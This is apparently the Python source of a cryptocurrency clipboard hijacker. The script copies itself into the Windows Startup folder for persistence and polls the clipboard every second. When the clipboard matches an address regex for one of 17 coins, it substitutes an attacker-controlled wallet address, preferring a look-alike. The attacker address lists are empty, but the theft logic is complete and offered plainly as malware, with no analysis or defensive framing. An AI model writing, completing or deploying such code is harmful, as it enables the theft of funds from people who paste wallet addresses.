
import re
import os
import time
import shutil
import random
import difflib

import tkinter as tk

patterns = [
    r'^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$', # Bitcoin
    r'^0x[a-zA-F0-9]{40}$', # Ethereum
    r'[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$', # Litecoin
    r'^4([0-9]|[A-B])(.){93}$', # Monero
    r'^[a-zA-Z0-9]{32}$', # Solana
    r'^[A-Z2-7]{58}$', # Algorand
    r'^r[1-9A-HJ-NP-Za-km-z]{24,34}$', # XRP
    r'^[0-9a-zA-Z]{34}$', # Dogecoin
    r'^0x[a-zA-Z0-9]{40}$', # Matic
    r'^0x[a-zA-Z0-9]{40}$', # Therter
    r'^bnb1[a-zA-HJ-NP-Z0-9]{25,39}$', # BNB
    r'^0x[a-zA-Z0-9]{40}$', # USDC
    r'^[0-9a-zA-Z]{59}$', # ADA
    r'^0x[a-zA-Z0-9]{40}$', # Polygon
    r'^[0-9a-zA-Z]{40}$', # Shiba Inu
    r'^X[1-9A-HJ-NP-Za-km-z]{33}$', # Dash
    r'^0x[a-zA-Z0-9]{40}$', # AVAX
]

btc = [
    '',
]

eth = [
    '',
]


ltc = [
    '',
]
monero = [
    '',
]

sol = [
    '',
]

algo = [
    '',
]

xrp = [
    '',
]

doge = [
    '',
]

matick = [
    '',
]

usdt = [
    '',
]

bnb = [
    '',
]

usdc = [
    '',
]

ada = [
    '',
]

polygon = [
    '',
]

shiba = [
    '',
]

dash = [
    '',
]

avax = [
    '',
]


def start_up():
    user = os.getlogin()
    basename = os.path.basename(__file__)
    shutil.copy(os.getcwd() + basename,'C:/Users/'+user+'/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/')


def clipper():
    while True:
        time.sleep(1)

        root = tk.Tk()
        clipboard = root.clipboard_get()
        
        for pattern in patterns:
            if re.match(pattern, clipboard):
                index = patterns.index(pattern)

                if index == 0:
                    address_list = btc

                elif index == 1:
                    address_list = eth

                elif index == 2:
                    address_list = ltc

                elif index == 3:
                    address_list = monero

                elif index == 4:
                    address_list = sol

                elif index == 5:
                    address_list = algo

                elif index == 6:
                    address_list = xrp

                elif index == 7:
                    address_list = doge

                elif index == 8: 
                    address_list = matick   

                elif index == 9:
                    address_list = usdt

                elif index == 10:
                    address_list = bnb

                elif index == 11:
                    address_list = usdc

                elif index == 12:
                    address_list = ada

                elif index == 13:
                    address_list = polygon

                elif index == 14:
                    address_list = shiba

                elif index == 15:
                    address_list = dash
                
                elif index == 16:
                    address_list = avax
                
                match_address = difflib.get_close_matches(clipboard, address_list) # Finds a close match
                if not match_address: # If no close match is found, choose a random address
                    match_address = random.choice(address_list)

                root.clipboard_append(''.join(match_address))
            else:
                pass


if __name__ == '__main__':
    start_up()
    clipper()
